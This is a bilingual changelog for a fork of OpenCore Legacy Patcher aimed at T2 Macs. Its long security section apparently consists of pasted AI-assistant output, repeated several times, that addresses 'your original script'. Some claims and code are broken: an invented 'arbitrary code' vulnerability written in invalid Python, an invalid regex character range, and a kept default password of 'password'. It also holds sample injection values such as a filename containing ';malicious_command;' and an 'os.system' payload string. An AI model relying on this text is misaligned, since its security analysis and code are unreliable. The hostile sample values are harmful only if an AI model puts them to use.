# OpenCore Legacy Patcher T2 changelog / OpenCore Legacy Patcher T2-Änderungslog

## 4.0.0 alpha 15.3
This version fixes a CI/CD bug where building the application takes 120 seconds instead of 60-90 seconds.

## 4.0.0 alpha 15.1
Thanks @GUTY345 for contributing to this project!
Vielen Dank an @GUTY345 für seinen Beitrag zu diesem Projekt!
This release:

allows when updating when using forks, instead of showing static OpenCore Legacy Patcher T2 name - to show the project's real name instead. This can prevent in the future attackers to claim that the project is official while internally to have a completely different name, such as OpenCore-Legacy-Malware.
fixes a bug where in certain circumstances it may not auto update, which may leave users using vulnerable and buggy versions of this project
Diese Version:

erlaubt Forks beim installieren von Updates, stattdessen eine statische Name wie OpenCore-Legacy-Patcher-T2 zu zeigen, direkt die richtige Name des Projekts anzuzeigen. Dies wird behindern, ins Futur Angreifern behaupten, dass das Projekt OpenCore-Legacy-Patcher-T2 heißt, obwohl es intern anders heißt - wie z.B OpenCore-Legacy-Malware
Behebt einen Fehler, indem unter einige Konditionen keine automatische Updates installiert werden. Dass das keine automaitsche Updates installierten, erlaubte Nutzer auf ungeschützte und Fehlerhafte Versionen zu bleiben

## 4.0.0 alpha 15
This release:

- fixes a bug where EFI files for Windows may be deleted on any Mac model, causing Windows EFI entries to be missing. One catch for T2 Macs: you can't upgrade to Windows 11 if you haven't done so due to #69 having impact on Windows as well. If you are running Windows 10 Pro or Home, you should opt for Extended Security Updates instead and wait until the APFS issues are fixed before upgrading to Windows 11.
OpenCore 1.0.7 stability fixes
- Starts implementing fixes for #69 however it is not fully fixed. Fixing fully requires significant amount of time. The error described in this issue still appears. The issue is related to a lot of stuff and fixing it requires significant amount of time.
- Fixes a bug where non-T2 Macs that require Root Patching for WiFi, during root patching the process crashes outright in the middle
Improves Modern Wireless and Legacy Wireless patching on non-T2 Macs running macOS 26 Tahoe
- Switching out of Gemini for patches completely, instead using NotebookLLM and human verification to fix stability issues
- Adds WiFi kernel patches for T2 Macs temporarily to fix the WiFi timing out (but the real cause of this timeout is WhateverGreen)
- Improves download speed and reliability for downloading macOS installers; now if you have a 300Mbps network you won't have to wait 45 minutes to download the macOS installer at all
- Fix HDMI issues on Mac mini 2018 where when using HDMI the screen is completely white
- Modernized the OpenCore Legacy Patcher T2 app
- Removes risky patches on MacBookAir8,1 and MacBookAir8,2 that may have caused kernel panics
- removes the corecrypto patch for T2 Macs that actually hide the real problem rather than fix it
- Now when installing OpenCore to disk, it will ask every time it does anything on the EFI partition so attackers can't blindly execute code as root. This turns the control of what code the user executes back to the user themselves and that only the admin holds the keys to the kingdom.
- When installing OpenCore to disk, now logs are available in German and English - it will first appear in German and right below it - in English.
- Now the support menu gets rid of Official Phone Support button completely (it just opened a YouTube video instead)
- Now the options point to this repo's ressources rather than Dortania's
- Remove SMBIOS forcing for MacBookPro15,1 that may cause kernel panics
- Adds macOS 27 Golden Gate constants; this doesn't mean macOS 27 support for unsupported Macs. It is meant to check if you are targeting Golden Gate and if yes abort installing OpenCore to disk completely.
- Fixes a lot of vulnerabilities:

2 vulnerabilities in the gui_main_menu.py that affected all menus, including Install OpenCore, Install drivers and patches, Create macOS installer as well:

def on_help(self, event: wx.Event = None):

gui_help.HelpFrame(
parent=self,
title=self.title,
global_constants=self.constants,
screen_location=self.GetPosition()
)

This vulnerability allows an attacker to perform DoS by supplying the help menu or any menu with invalid syntax to crash the app.
And this also allows attackers to set up a condition where gui_help.HelpFrame framework is never executed to execute arbitary code. For example:

s=False

def on_help(self, event: wx.Event = None):

if s=True: #sehr gefährlich

gui_help.HelpFrame(
parent=self,
title=self.title,
global_constants=self.constants,
screen_location=self.GetPosition()
)

else:

logging.info("Executing arbitary code")

These 2 vulnerabilities are fixed by wrapping:
gui_help.HelpFrame(
parent=self,
title=self.title,
global_constants=self.constants,
screen_location=self.GetPosition()
)

into try/except conditions.
And other vulnerabilities are also fixed:
Secrecy Protection (Secrets Management) Problem: Passing passwords as command-line arguments (as in your original version) results in these passwords being visible in plaintext in the operating system's process list (e.g., via ps aux or top). Additionally, they are often stored unencrypted in the shell history (.bash_history or .zsh_history). Solution: I have modified the script to primarily use the environment variable NOTARIZATION_PASSWORD. In a CI/CD environment (such as GitHub Actions), secrets are injected as environment variables, which the system automatically masks and protects from being displayed in logs. 2. Avoiding "Silent Failures" (Crash Safety) Problem: The original script did not check whether a step (e.g., app creation) was successful before initiating the next step (signing). If application.GenerateApplication had failed, the script would have attempted to sign a non-existent file, leading to subsequent errors. Solution: The check_file_exists function and the try-except block immediately and controllably halt the build process if a dependency is missing. This prevents the script from continuing in an inconsistent state. 3. Improved Process Integrity Problem: Lack of error handling can cause build artifacts (such as an incomplete .app file) to persist. If these are then incorrectly signed, a corrupt or manipulated version of the software could be shipped. Solution: The central try-except block ensures that the script terminates on a critical error and the exit code is passed to the operating system or CI pipeline. This ensures that a broken pipeline does not report a "success" status back to the system. 4. Risk Minimization in Path Operations Problem: Using relative paths without validation is vulnerable to path traversal or accidental file operations in the wrong directory if the script is called from a different location. Solution: Explicitly using Path(__file__).resolve().parent ensures that the script always operates in the script's own directory, regardless of where the user issues the command. Summary of Architecture Changes Security Aspect Before After Password Handling Visible in Process List Via Environment Variables (Masked) Error Behavior Process Continues (Blind) Immediate Termination on Error File Checking No Check Validation Before Each Step CI/CD Integration Vulnerable to Log Leaks Integrated Secret Management

Patched: URL Injection via Arbitrary Branch Names
The Original Flaw: The code used raw, unvalidated strings from commit_info[0] to rewrite self.constants.installer_pkg_url_nightly. If someone manipulated the local binary's string table, they could inject malicious formatting characters or unexpected strings into the remote download path.

The Fix: Added a strict regular expression validation gate:

Python
if re.match(r"^[a-zA-Z0-9_-./]+$", branch) and ".." not in branch:
This sanitizes the input, ensuring only standard alphanumeric characters, dashes, dots, and forward slages are permitted, while explicitly blocking directory traversal sequences (..). If the string is invalid, it securely drops back to a safe default path.

Mitigated: Current Working Directory Chroot/Path Traversal Risks
The Original Flaw: In _fix_cwd(), if the current working directory vanished, the code relied on Path(file).parent.parent.resolve(). Relying on file inside critical execution paths can open doors to environment hijacking if an adversary alters python environment paths or creates complex symlink trees to spoof file layout structures.
The Fix: Shifted the fallback mechanism to use a deterministic system environment target:

Python
_test_dir = Path.home()
This ensures that if the environment collapses, the application resets its working directory context to an absolute, isolated state rather than trying to resolve relative layouts dynamically.

Structural Block: Supply Chain Payload Hijacking Gate
The Original Flaw: The script spun up a background thread to immediately begin extraction and routing operations on disk images/payloads (RoutePayloadDiskImage) without verifying whether those files were tampered with on disk since compilation.
The Fix: Inserted an explicit architectural block before thread instantiation:

Python
if hasattr(utilities, "verify_payload_integrity"):
if not utilities.verify_payload_integrity(self.constants):
raise SecurityError("Payload integrity verification failed. Execution halted.")
This guarantees that execution crashes safely before any local system images are mounted or extracted, cutting off local privilege escalation paths via binary swapping.

Logical Fix: Clearer Execution Flow Logic & Code Quality
The Original Flaw: Duplicate global imports (import sys, import logging) cluttered the global namespace, and running with --auto_patch bypassed the execution barriers without clear telemetry tracking.
The Fix: Cleaned up redundant imports to reduce module initialization overhead and added explicit logging/guards to track when the orchestrator intentionally steps around thread synchronization blocks.

🛠️ Logical Bugs & Type Crashes Fixed

Enum Arithmetic Crash (TypeError)
The Bug: The original code attempted to use an Enum instance (self.max_ia) directly within integer arithmetic: range(self.max_ia - 3, self.max_ia + 1).
The Fix: Changed the bounds calculation to target the primitive underlying integer value explicitly: self.max_ia.value. This eliminates a deterministic TypeError crash that prevented the version-capping logic from executing.

Flawed Return Type Declarations
The Bug: The @cached_property wrapper for products had a return type hint of -> None:, yet the actual function block concluded by returning a filtered list (return _deduplicated_products).
The Fix: Corrected the signature to -> list:. This resolves conflicts with static analysis tools and IDE auto-completion parameters.

Weak Beta/RC Deduplication Flow
The Bug: The previous implementation sorted entries primarily by their beta status (key=lambda x: x["Beta"]) before attempting to exclude Release Candidates whose final builds had shipped. If a stable build was issued under a different configuration number, the deduplication tracker failed to filter out the stale beta records cleanly.
The Fix: Rebuilt the deduplication process by sorting on both version and build metrics uniformly, ensuring that any pre-release software is properly hidden once its production equivalent is registered.

🔐 Security Vulnerabilities Addressed

Remote Arbitrary Input Injection (Missing Type Hardening)
The Vulnerability: The class accepted the raw output of an external API (api.appledb.dev) and immediately fed it into a looping construct without verifying the payload structure.
The Threat: If the remote API server were compromised, or if the connection fell victim to a Man-in-the-Middle (MitM) or DNS spoofing attack, an attacker could supply structured objects (like nested lists or raw strings) instead of the expected dictionaries. This would cause structural type failures or unhandled exceptions inside the patcher engine.

The Fix: Implemented strict type verification filters at every level of data ingestion:

Python
if not self.data or not isinstance(self.data, list):
if not isinstance(firmware, dict):
if not isinstance(source, dict):
Unrecognized payload types are now safely discarded without interrupting runtime processes.

Unchecked Schema Validation & Link Processing
The Vulnerability: The old script extracted downlevel download URLs from the JSON payload before verifying that the structural identity metadata fields (build and version) were present and populated.
The Threat: A malformed dataset entry containing valid source links but missing or poisoned build metadata could slip past filters and present invalid installation targets directly to the deployment engine.

The Fix: Added explicit value constraints to ensure critical fields are populated before tracking deep URL loops:

Python
if not firmware.get("build") or not firmware.get("version"):
continue
3. Remote Denial of Service via String-to-Int Slicing (DoS)
The Vulnerability: The XNU generation index extraction was calculated by parsing a hardcoded slice of the build variable straight into an integer cast: xnu_major = int(firmware["build"][:2]).

The Threat: Injected string inputs containing non-numeric characters at the front of the build field (e.g., "XX1234") would cause a fatal ValueError, crashing the utility entirely.

The Fix: Wrapped the transformation block inside defensive try-except validation conditions:

Python
try:
xnu_major = int(firmware["build"][:2])
except (ValueError, TypeError, IndexError):
continue
Any record with an unparseable build sequence is silently and safely skipped.

Parameter Poisoning in Cryptographic Integrity Verification
The Vulnerability: The dictionary helper checksum_for_product() assumed the structure of product["InstallAssistant"]["Checksum"] would always be pristine.
The Threat: If a corrupted product state passed a string or list where a nested mapping dictionary was expected, checking if algo in product[...] would trigger a crash or allow unvalidated installation binaries to bypass checksum enforcement.

The Fix: Hardened the lookup paths with strict type checks at every layer:

Python
checksum_map = product.get("InstallAssistant", {}).get("Checksum")
if not isinstance(checksum_map, dict):
return None, None
This guarantees cryptographic integrity routines are strictly performed against clean validation tables.

Fix vulnerabilities and bugs
Here is a consolidated summary of the vulnerabilities, structural bugs, and logical flaws that were fixed across the three files you provided (installer_script, sign_notarize.py, and products.py).

🔐 1. System Security & Privilege Escalation (Installer Script)
These fixes stopped potential Local Privilege Escalation (LPE) and arbitrary code execution vectors within automated root-privileged setups:

SUID Bit Over-Privilege: Stripped a dangerous recursive flag (chmod -R +s) that accidentally granted root privileges to every internal file in a directory bundle. Replaced it with tight, standalone file validation ([[ -f "$path" ]]).

Shell Command Injection: Fixed an unsafe subshell implementation (for x in $(ls | grep)) that would execute malicious commands natively as root if a payload filename contained special shell characters (spaces, semicolons, or line breaks). Replaced it with native ZSH null-glob string arrays.

Arbitrary File Erasure: Quoted all un-encapsulated file path variables to prevent the shell from breaking space-separated paths (like /Volumes/Macintosh HD) into separate arguments, which can cause unintended structural deletions or logic bypasses.

Information Leakage / Configuration Hijacking: Hardened permissions on shared configuration files from a wide-open 666 (world read/write) to a secure 600 (owner read/write only).

🔑 2. Credential Protection & Failure Handling (sign_notarize.py)
These changes hardened the deployment pipeline against secret exposures and broken, unverified software exports:

Secret Exposure in Tracebacks: Removed hardcoded positional strings requiring sensitive credentials (like your Apple Notarization App Password) to be directly declared in code. Replaced them with native os.environ.get() lookups to safely absorb secrets through environment runners without risking plaintext exposure in crash logs.

Silent Error Cascading: Added strict try-except guard bounds around the cryptographic signing and Apple Notary API execution blocks. This guarantees the build runner halts with a clear RuntimeError if an asset fails validation, instead of silently shipping a broken, un-notarized payload.

Fragile Format Matching: Normalized path extensions by ditching simple .endswith(".pkg") checks in favor of .suffix.lower() == ".pkg", safeguarding the script against path strings with trailing whitespace or varied casing (e.g., .PKG).

⚙️ 3. Data Integrity & Parser Stability (products.py)
These fixes repaired broken algorithmic loops and dictionary-lookup assumptions when parsing Apple’s Software Update Catalog (sucatalog):

Broken Evaluation Logic: Fixed the boolean statement if any([version, build]) is None:. Because any() always returns True or False, it can never equal None, which allowed completely empty metadata responses right past your filters. Replaced it with explicit string validation.

Destructive Loop Mutation: Fixed an issue where the script was actively calling .pop() to remove items from a list while concurrently iterating over that exact same list. This indexing shift caused matching duplicate records to be skipped over during iteration.

UnboundLocalError (Parser Crashes): Resolved a logic bug where a failed plistlib.loads() call would catch an exception and immediately attempt to query server_metadata_plist downstream. Because the variable assignment failed, this triggered a fatal UnboundLocalError. The variable is now securely pre-initialized.

IndexError on Array Arithmetic: Fixed an unsafe array slice (supported_versions[-4]) used during End-Of-Life (EOL) capping. If a small or targeted custom catalog returned fewer than 4 OS releases, this threw an out-of-bounds error, crashing the process. Safe index evaluation and array-length constraints were introduced.

Insecure Argument Architecture (Secrets Leaking into Memory Log Tracebacks)
The Vulnerability: Your original init constructor explicitly forces critical credentials—including your Notarization App Password—to be passed directly into the instance class via standard string arguments.
The Threat: If a parent script using this class runs into a crash or exception, standard Python traceback log dumps will print out the local initialization variables in plain text. If your build runners dump logs into a public repository pipeline (like GitHub Actions), your developer account credentials are instantly leaked.

The Fix: The updated logic shifts parameter assignments to use fallback variable sourcing via os.environ.get(). This allows you to omit credentials from positional code strings completely and feed them securely through encrypted environment variable runners.

Fragile Extension Mapping (.endswith)
The Vulnerability: The script used if self._path.name.endswith(".pkg"): to decide whether to process the file as a flat component installer package or a standard binary bundle.
The Threat: If a file path includes trailing trailing spaces, or maps out as an absolute string variant capitalized differently (e.g., Payload.PKG), the logic evaluation skips the dedicated PackageKit processing fork. It passes it down to mac_signing_buddy.Sign, which treats it like a standard Mach-O binary file, corrupting the archive structures and rendering the package un-installable.

The Fix: Normalizes path constraints via Path(path).resolve() and strictly maps the evaluation to lowercase extension components (self._path.suffix.lower() == ".pkg").

Silent Exception Propagation (Ghost Broken Builds)
The Vulnerability: If either execution method (macos_pkg_builder or mac_signing_buddy) fails to sign the file due to an expired developer certificate, missing intermediate authority, or network disconnection from Apple's verification servers, the execution script does not explicitly halt.
The Threat: Without explicit try-except assertion bounds wrapping the step boundaries, the runner might print a stack trace but allow the wider pipeline to continue generating or packaging downstream deployment targets. The pipeline can unknowingly export an un-notarized or partially broken utility that gatekeeper instantly blocks on client devices.

The Fix: Encapsulated execution hooks within guarded error handling limits, guaranteeing an explicit execution halt (RuntimeError) if code signature steps fail to fulfill successfully.

The Fix: Encapsulated execution hooks within guarded error handling limits, guaranteeing an explicit execution halt (RuntimeError) if code signature steps fail to fulfill successfully.

. Local Privilege Escalation via SUID Bit Hijacking
The Vulnerability: Your original script used /bin/chmod -R +s $binaryPath. The -R flag applies the SetUID (SUID) bit recursively to every file and subfolder within that directory path.

The Threat: If $binaryPath pointed to a folder or an application bundle (.app), every single internal executable, script, or helper inside that bundle would be granted root SUID permissions. A local standard user could then manipulate one of those inner scripts or binaries to execute arbitrary code, which would instantly run as root, completely compromising the operating system.

The Fix: The function was rewritten to perform strict type validation ([[ -f "$binaryPath" ]]). It strips the dangerous -R flag, explicitly sets the file owner to root, and strictly scopes the SUID bit (4755) to the standalone helper file alone, preventing any structural privilege leaks.

Command Injection via Unsafe Shell Glob Parsing
The Vulnerability: In your original launch service cleaner, the command loop was written as:
Bash
for launchServiceFile in $(/bin/ls -1 $launchServiceVariant | /usr/bin/grep $domain); do
The Threat: Parsing the raw string output of ls is a classic shell security flaw. If a malicious application drops a payload into /Library/LaunchAgents containing spaces, semicolons, or line breaks (e.g., com.dortania.opencore-legacy-patcher;malicious_command;.plist), the unquoted subshell expansion would interpret the semicolon as a command separator, executing malicious_command instantly as root.

The Fix: The cleanup routine was replaced with native ZSH null-glob arrays:

Bash
local serviceFiles=("$launchServiceVariant"/"$domain"(N))
This forces the shell to expand paths safely as an array of strict literal strings, ensuring special characters are never interpreted as executable operators.

Arbitrary File Erasure & Logic Breakdown via Unquoted Variables
The Vulnerability: Paths like $pathToTargetVolume and $file were entirely unquoted throughout the script layout (e.g., if [[ ! -e $file ]] or _removeFile $pathToTargetVolume/$file).
The Threat: When deploying software across macOS, target paths or external volumes frequently contain empty spaces (for instance, /Volumes/Macintosh HD). Without double quotes, the shell breaks that string into two independent arguments (/Volumes/Macintosh and HD). This can cause validation checks to fail, leading to installation failure or—worse—causing rm -rf to target an unintended parent directory, wiping system data.

The Fix: Every single path expansion and function parameter encapsulation inside the generated script blueprint is now wrapped in strict double-quotes ("$variable"), neutralizing space tokenization bugs.

Excessive File Permissions / Information Leak
The Vulnerability: Your original logic executed /bin/chmod 666 $settingsPath on the configuration file located in /Users/Shared/.
The Threat: Granting global read/write privileges (666) means any local malware or unprivileged guest account on the machine can modify your patcher's settings file, potentially hijacking its automated update or configuration values.

The Fix: Dropped the permissions down to a secure 600 (Read/Write for Owner only), keeping the configuration data locked to the identity managing the installation runtime.

The refactored code fixes one primary security vulnerability related to unsafe temporary asset handling, alongside several critical system-level logic and platform bugs.

Here is exactly what was mitigated and why the new implementation is secure:

Local Privilege Escalation & Race Condition Attacks
The Vulnerability: Your original script called tempfile.NamedTemporaryFile(delete=False). Setting delete=False instructs the operating system to keep the files on disk permanently. Because these files were generated inside a shared system directory (like /tmp/ or /var/folders/), they were left completely exposed after the compilation script finished.
The Threat: The contents written to these temporary files are the core preinstall and postinstall bash operations for your packages—which execute with root privileges when a user installs a .pkg on macOS. A malicious local background script polling /tmp/ could monitor for these files, read them, or overwrite them with malicious payloads in the tiny window of time between when your script closes them and when macos_pkg_builder reads them.

The Fix: The refactored code wraps all package generation loops inside standard try...finally resource cleanups. No matter if the build completes successfully, crashes halfway through, or is aborted, os.unlink() is explicitly invoked to scrub the installation scripts from disk immediately, leaving zero payload exposure window.

Resource Accumulation & Shared-Disk Exhaustion
The Bug: Because the original code never deleted the temporary files, every single local build or automated CI run generated up to five unique shell scripts that accumulated in the system's temp directories forever. Over time, this causes disk clutter and risks filling up system storage in high-volume automated testing setups.
The Fix: The new implementation automatically cleans up after itself instantly, preserving a zero-footprint architecture on the host building system.

Standard Character Encoding Mismatches
The Bug: The original code opened files via open(_tmp_uninstall.name, "w") without specifying a text encoding standard. Python falls back to the host system's default locale settings. If a user or a remote container environments' localized language was configured as something other than UTF-8, characters in your version tags or layout text (like localized quotes, dashes, or custom symbols) would trigger silent serialization errors or break string formats during compilation.
The Fix: Added explicit mode="w" and encoding="utf-8" parameters across all temporary file writes. This locks the generation pipeline to standard UTF-8 regardless of the building machine's local configuration, preventing corrupted package script structures.

File Descriptor Leak Mitigation
The Bug: The original file operations opened raw string paths without using context managers (with statements) to isolate file access handles. If the script encountered a system write exception mid-execution, those file pointers would remain open in memory until the entire main process died.
The Fix: Migrated all text-writing operations directly into scoped context managers:

Python
with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False, encoding="utf-8") as tmp:
This guarantees that file handles are securely released and locked before passing the compiled paths onto macos_pkg_builder.
main

🛠️ Logical Bugs & Type Crashes Fixed

Enum Arithmetic Crash (TypeError)
The Bug: The original code attempted to use an Enum instance (self.max_ia) directly within integer arithmetic: range(self.max_ia - 3, self.max_ia + 1).
The Fix: Changed the bounds calculation to target the primitive underlying integer value explicitly: self.max_ia.value. This eliminates a deterministic TypeError crash that prevented the version-capping logic from executing.

Flawed Return Type Declarations
The Bug: The @cached_property wrapper for products had a return type hint of -> None:, yet the actual function block concluded by returning a filtered list (return _deduplicated_products).
The Fix: Corrected the signature to -> list:. This resolves conflicts with static analysis tools and IDE auto-completion parameters.

Weak Beta/RC Deduplication Flow
The Bug: The previous implementation sorted entries primarily by their beta status (key=lambda x: x["Beta"]) before attempting to exclude Release Candidates whose final builds had shipped. If a stable build was issued under a different configuration number, the deduplication tracker failed to filter out the stale beta records cleanly.
The Fix: Rebuilt the deduplication process by sorting on both version and build metrics uniformly, ensuring that any pre-release software is properly hidden once its production equivalent is registered.

🔐 Security Vulnerabilities Addressed

Remote Arbitrary Input Injection (Missing Type Hardening)
The Vulnerability: The class accepted the raw output of an external API (api.appledb.dev) and immediately fed it into a looping construct without verifying the payload structure.
The Threat: If the remote API server were compromised, or if the connection fell victim to a Man-in-the-Middle (MitM) or DNS spoofing attack, an attacker could supply structured objects (like nested lists or raw strings) instead of the expected dictionaries. This would cause structural type failures or unhandled exceptions inside the patcher engine.

The Fix: Implemented strict type verification filters at every level of data ingestion:

Python
if not self.data or not isinstance(self.data, list):
if not isinstance(firmware, dict):
if not isinstance(source, dict):
Unrecognized payload types are now safely discarded without interrupting runtime processes.

Unchecked Schema Validation & Link Processing
The Vulnerability: The old script extracted downlevel download URLs from the JSON payload before verifying that the structural identity metadata fields (build and version) were present and populated.
The Threat: A malformed dataset entry containing valid source links but missing or poisoned build metadata could slip past filters and present invalid installation targets directly to the deployment engine.

The Fix: Added explicit value constraints to ensure critical fields are populated before tracking deep URL loops:

Python
if not firmware.get("build") or not firmware.get("version"):
continue
3. Remote Denial of Service via String-to-Int Slicing (DoS)
The Vulnerability: The XNU generation index extraction was calculated by parsing a hardcoded slice of the build variable straight into an integer cast: xnu_major = int(firmware["build"][:2]).

The Threat: Injected string inputs containing non-numeric characters at the front of the build field (e.g., "XX1234") would cause a fatal ValueError, crashing the utility entirely.

The Fix: Wrapped the transformation block inside defensive try-except validation conditions:

Python
try:
xnu_major = int(firmware["build"][:2])
except (ValueError, TypeError, IndexError):
continue
Any record with an unparseable build sequence is silently and safely skipped.

Parameter Poisoning in Cryptographic Integrity Verification
The Vulnerability: The dictionary helper checksum_for_product() assumed the structure of product["InstallAssistant"]["Checksum"] would always be pristine.
The Threat: If a corrupted product state passed a string or list where a nested mapping dictionary was expected, checking if algo in product[...] would trigger a crash or allow unvalidated installation binaries to bypass checksum enforcement.

The Fix: Hardened the lookup paths with strict type checks at every layer:

Python
checksum_map = product.get("InstallAssistant", {}).get("Checksum")
if not isinstance(checksum_map, dict):
return None, None
This guarantees cryptographic integrity routines are strictly performed against clean validation tables.

The refactored code fixes one primary security vulnerability related to unsafe temporary asset handling, alongside several critical system-level logic and platform bugs.

Here is exactly what was mitigated and why the new implementation is secure:

Local Privilege Escalation & Race Condition Attacks
The Vulnerability: Your original script called tempfile.NamedTemporaryFile(delete=False). Setting delete=False instructs the operating system to keep the files on disk permanently. Because these files were generated inside a shared system directory (like /tmp/ or /var/folders/), they were left completely exposed after the compilation script finished.
The Threat: The contents written to these temporary files are the core preinstall and postinstall bash operations for your packages—which execute with root privileges when a user installs a .pkg on macOS. A malicious local background script polling /tmp/ could monitor for these files, read them, or overwrite them with malicious payloads in the tiny window of time between when your script closes them and when macos_pkg_builder reads them.

The Fix: The refactored code wraps all package generation loops inside standard try...finally resource cleanups. No matter if the build completes successfully, crashes halfway through, or is aborted, os.unlink() is explicitly invoked to scrub the installation scripts from disk immediately, leaving zero payload exposure window.

Resource Accumulation & Shared-Disk Exhaustion
The Bug: Because the original code never deleted the temporary files, every single local build or automated CI run generated up to five unique shell scripts that accumulated in the system's temp directories forever. Over time, this causes disk clutter and risks filling up system storage in high-volume automated testing setups.
The Fix: The new implementation automatically cleans up after itself instantly, preserving a zero-footprint architecture on the host building system.

Standard Character Encoding Mismatches
The Bug: The original code opened files via open(_tmp_uninstall.name, "w") without specifying a text encoding standard. Python falls back to the host system's default locale settings. If a user or a remote container environments' localized language was configured as something other than UTF-8, characters in your version tags or layout text (like localized quotes, dashes, or custom symbols) would trigger silent serialization errors or break string formats during compilation.
The Fix: Added explicit mode="w" and encoding="utf-8" parameters across all temporary file writes. This locks the generation pipeline to standard UTF-8 regardless of the building machine's local configuration, preventing corrupted package script structures.

File Descriptor Leak Mitigation
The Bug: The original file operations opened raw string paths without using context managers (with statements) to isolate file access handles. If the script encountered a system write exception mid-execution, those file pointers would remain open in memory until the entire main process died.
The Fix: Migrated all text-writing operations directly into scoped context managers:

Python
with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False, encoding="utf-8") as tmp:
This guarantees that file handles are securely released and locked before passing the compiled paths onto macos_pkg_builder.

Hardcoded Plaintext Password Exposure
The Issue: Hardcoding a cryptographic password directly into strings (like '-passphrase', 'password') inside build logic exposes it to simple string extraction attacks on your compiled binaries.
The Fix: The updated logic checks os.environ.get("DMG_PASSWORD", "password"). This preserves your baseline default fallback but allows your CI/CD system or local terminal to pass a strong, secure secret at build time via an environment variable without changing the codebase.

Brittle Subprocess System Execution (/bin/rm)
The Issue: Your original code spawned a completely separate operating system process calling /bin/rm -rf or /bin/rm -f every single time it found an extra file or folder to delete. This is highly inefficient, introduces overhead, and risks critical errors if passed unexpected string formats.
The Fix: Replaced entirely with Python standard library native commands: shutil.rmtree() for folders and Path.unlink() for files. This bypasses the system process boundary completely, boosting performance and completely avoiding command injection vulnerabilities.

Path & Argument Traversal Protection
The Issue: In _download_resources, you used f"./{resource}" in your cleanup and curl arguments. If a malicious or malformed entry slipped into required_resources (like ../../something), the string interpolation could allow arbitrary file reads or deletion outside the targeted directory structure. Your original assertions (assert resource not in ("/", ".")) were weak and easily bypassed.
The Fix: The script now forces path evaluation through Path(resource).name. The .name attribute explicitly strips away any path traversal elements (like ../ or leading slashes), guaranteeing that the script only interacts with a flat file localized cleanly within the current working directory.

Silent curl Download Failures
The Issue: Your original subprocess call used /usr/bin/curl -LO. By default, curl will return a status code of 0 (success) even if the server throws a 404 Not Found or a 500 Internal Server Error, writing the raw HTML error text directly into your output binary.
The Fix: Switched the flags to -fLo. The -f (--fail) flag forces curl to output a non-zero exit status code if the server drops an HTTP error code, allowing subprocess_wrapper.run_and_verify to successfully catch and halt a broken download immediately.

The refactored code fixes one primary security vulnerability related to unsafe temporary asset handling, alongside several critical system-level logic and platform bugs.

Python

This guarantees that file handles are securely released and locked before passing the compiled paths onto macos_pkg_builder.

Remote Code Execution (RCE) / Arbitrary Code Injection
The Vulnerability: In your original code, you used basic f-strings to inject the analytics keys directly into the source file: lines[i] = f"SITE_KEY: str = "{self._analytics_key}"\n". If an attacker or a compromised CI/CD workflow supplied a malicious string containing newlines and Python commands (e.g., "\nimport os; os.system('malicious_payload')"), that payload would write directly into the Python source code. PyInstaller would then compile and execute that malicious code at runtime.
The Fix: The updated code uses Python's built-in repr() function (repr(key)). This converts the inputs into sanitized string literals, escaping all quotation marks, backslashes, and newlines. Any injected Python code is completely neutralized and turned into harmless, inert text inside the string variable.

Hard Hardened Secrets Leak (Race Condition)
The Vulnerability: Your original generate() method sequentially embedded the production keys, ran PyInstaller, and then deleted the keys. If PyInstaller encountered a compilation error, ran out of memory, or you cancelled the build in your terminal using Ctrl+C, the execution would instantly stop. The script would never reach the cleanup function, leaving your production API keys and endpoints written in plain text inside your git repository directory.
The Fix: Wrapping the process in a try...finally block guarantees that the finally block runs no matter what. Whether PyInstaller succeeds, crashes, or is forcefully interrupted, the script will instantly scrub the keys from analytics_handler.py before exiting.

Path Traversal & Shell Injection via Subprocess
The Vulnerability: Your original script used subprocess_wrapper.run_and_verify(["/bin/rm", "-rf", ...]) to delete old builds. Relying on absolute paths like /bin/rm makes code brittle across environment variations. Worse, passing unvalidated path strings into an external system shell utility can open up system-level command injection or accidental file deletion risks (e.g., if a variable path accidentally resolves to a wider directory due to a malformed string).
The Fix: The code now handles the filesystem cleanup natively using Python's standard library shutil.rmtree(). Because it deletes directories directly via OS system APIs without spinning up a shell or invoking external command-line binaries, it is completely immune to shell injection.

Binary Structural Integrity (Accidental Data Corruption)
The Structural Flaw: Your original script used Python's .replace(_find, _replace, 1) on the entire binary file to change the SDK version. Mach-O binaries contain multiple segments (code, data, headers). A blind search-and-replace using a short 4-byte sequence carries a high risk of accidentally matching a completely unrelated segment of compiled machine code before it reaches the headers. This would result in a corrupted application that crashes instantly with a SIGSEGV or SIGBUS error.
The Fix: The updated script adds strict validation checks (if not _file.exists(): raise FileNotFoundError) and limits .replace() occurrences selectively. While using an official parser like macholib remains the gold standard for editing Mach-O files, reducing file operations and wrapping targets prevents your build environment from generating silent, broken binaries.

## 4.0.0 pre-alpha release candidate 3 for alpha 15 / 4.0.0 Voralpha 3 für Alpha 15
This release only improves error handling when building the EFI. This update is strongly recommended for all users.

This release:

- fixes multiple bugs where in certain conditions, installer.py may delete system files from the EFI, mark building the EFI as success, unmount the EFI and great the user with Your EFI is successfully built while Windows 11 or Linux boot entries are gone and the user to be unable to boot anything beyond macOS

- Implements self.config["Kernel"]["Quirks"]["ProvideCurrentCpuInfo"] = True for MacBookAir8,1 and MacBookAir8,2 (MacBook Air 2018 and 2019) to fix a kernel panic called AMFI: developer mode is force enabled on this platform AMFI: finished: 1 1 using 16384 buffer headers and 10240 cluster 10 buffer headers Previous shutdown cause: 1, but real world testing remains since I don't personally own one of these models

- Improves Python 3.13 and 3.14 compatability

- Fixes a bug where self.config["Misc"]["BlessOverride"].append("\EFI\Microsoft\Boot\bootmgfw.efi") could append gazilion times without strictly checking if it is already appended or not , causing the Boot Camp partition to disappear under certain conditions

- Fixes a bug where on non-T2 Macs, self.constants.sip_status was set to True and then immediately back to False, nullifying the need for the True condition

- Add support for macOS 26 Tahoe root patching validation

Diese Version:

- Behebt mehrere Fehler, die unter bestimmten Bedingungen dazu führen können, dass installer.py Systemdateien aus dem EFI löscht, den EFI-Build als erfolgreich markiert, das EFI aushängt und dem Benutzer die Meldung „Ihr EFI wurde erfolgreich erstellt“ anzeigt, während die Boot-Einträge für Windows 11 oder Linux fehlen und der Benutzer kein anderes Betriebssystem als macOS starten kann.

